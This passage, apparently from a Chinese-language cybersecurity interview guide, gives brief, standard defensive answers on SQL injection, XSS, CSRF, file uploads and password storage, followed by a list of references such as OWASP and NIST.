- 供应链安全
- 隐私计算
- 零信任深化
- SBOM软件物料清单
```

---

## 附录：常见面试问题

1. **SQL注入防御？**
   答：预编译ORM参数化

2. **XSS防御？**
   答：输出编码+CSP

3. **CSRF防御？**
   答：Token+SameSite

4. **文件上传如何保障？**
   答：白名单+重命名+隔离

5. **密码如何安全存储？**
   答：bcrypt/Argon2

---

## 参考资料

- OWASP Top 10
- 《Web Application Hacker's Handbook》
- PTES渗透测试执行标准
- NIST Cybersecurity Framework
- ATT&CK Matrix

---

> 整理by Claude Code | 网络安全面试高频100问